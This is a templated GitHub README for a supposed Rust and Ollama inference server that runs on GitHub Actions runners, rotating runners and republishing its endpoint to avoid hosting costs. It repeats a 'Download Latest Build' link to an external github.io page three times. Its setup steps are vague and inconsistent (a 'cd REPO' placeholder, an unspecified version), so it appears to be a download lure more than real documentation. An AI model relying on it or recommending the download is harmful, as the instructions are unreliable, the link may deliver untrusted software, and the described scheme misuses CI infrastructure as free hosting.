# AI Server - LLM Inference Server 2026

> **AI Server is an inference service written in Rust that uses Ollama-hosted models on GitHub Actions infrastructure, including automated runner replacement, scheduled redeployment, and continued API endpoint updates.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Actions-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/halltyleryb1408/ai-server-ollama-api?style=flat-square)](https://github.com/halltyleryb1408/ai-server-ollama-api)

---

<p align="center">
  <a href="https://halltyleryb1408.github.io/ai-server-ollama-api/">
    <img src="https://img.shields.io/badge/Download-AI%20Server%20Latest-brightgreen?style=for-the-badge" alt="Download AI Server">
  </a>
</p>

> **[Download the latest AI Server build](https://halltyleryb1408.github.io/ai-server-ollama-api/)**

---

[Download Latest Build](https://halltyleryb1408.github.io/ai-server-ollama-api/)

---

## Overview

AI Server combines Ollama model hosting with a Rust inference API, using GitHub Actions as the environment for launching and operating model-serving workloads. It offers a repeatable deployment approach for projects that need access to large language models without relying on standard paid hosting services.

The deployment workflow manages runner changes, recurring redeployments, and frontend endpoint updates. When the underlying execution location changes, the service can publish the new endpoint so applications can continue connecting to the active model server.

---

## What It Provides

- Runs LLMs through Ollama.
- Exposes a Rust-built inference API.
- Operates on GitHub Actions runners.
- Automates runner rotation within the hosting process.
- Allows redeployment on a cron schedule.
- Revises the frontend endpoint when the deployment location changes.
- Orchestrates infrastructure changes intended to reduce service interruption.
- Makes use of available infrastructure without a traditional hosting charge.

---

## Getting Started

First clone the repository and switch into its directory:

```bash
git clone https://github.com/halltyleryb1408/ai-server-ollama-api.git
cd REPO
```

Next, prepare an Ollama-compatible model and the Rust environment. Start the server through the GitHub Actions workflow configured in the repository, which serves as the main mechanism for deploying the service and publishing its current endpoint.

---

## Operating the Server

The usual deployment sequence is:

1. Choose or prepare an LLM that Ollama supports.
2. Start the deployment workflow in GitHub Actions.
3. Wait for the Rust inference service to launch on its assigned runner.
4. Connect an application or frontend to the endpoint published by the workflow.
5. Allow scheduled runs to perform redeployment and runner rotation.
6. If a transition produces a different address, update the frontend to use that endpoint.

API consumers should direct inference calls to the currently active Rust service endpoint supplied by the deployment workflow.

---

## Deployment Configuration

The repository's GitHub Actions workflow contains the deployment settings. Before launching the service for the first time, inspect those workflow files and provide the model, schedule, runner, and endpoint values needed for the intended setup.

An illustrative configuration is:

```yaml
model: your-ollama-model
redeploy_schedule: cron
runner_rotation: enabled
frontend_endpoint_updates: enabled
```

The project workflow files remain authoritative for the exact variable names and accepted values.

---

## System Requirements

- A GitHub repository where GitHub Actions is enabled.
- Ollama installed and able to host the selected LLM.
- Rust tools for building or executing the inference API.
- Enough runner capacity for the chosen model.
- Network connectivity for API users and frontend endpoint changes.
- Adequate storage for Ollama model files and build artifacts.

---

## Frequently Asked Questions

### Which models does AI Server host?

It runs LLM models through Ollama and makes them available through the Rust inference API.

### How do I launch a deployment?

Use the GitHub Actions deployment workflow. Recurring deployments can additionally be driven by a cron-triggered workflow.

### Will the service endpoint stay unchanged?

The active runner may change. When that happens, the workflow is intended to update the frontend endpoint, so clients should use the address most recently produced by deployment.

### What happens during runner rotation?

The deployment workflow automates movement between available runner sessions as part of its hosting process.

### Where are the model and schedule configured?

Open the GitHub Actions workflow configuration and modify the model and cron settings supported by this repository.

### What can I investigate when the service is unavailable?

Start by reviewing the newest GitHub Actions run. Then confirm that Ollama launched correctly, the requested model is present, and the frontend is using the latest endpoint.

### How are project updates applied?

Updates come from the repository and are applied by starting another workflow run or through the scheduled deployment mechanism provided by the project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
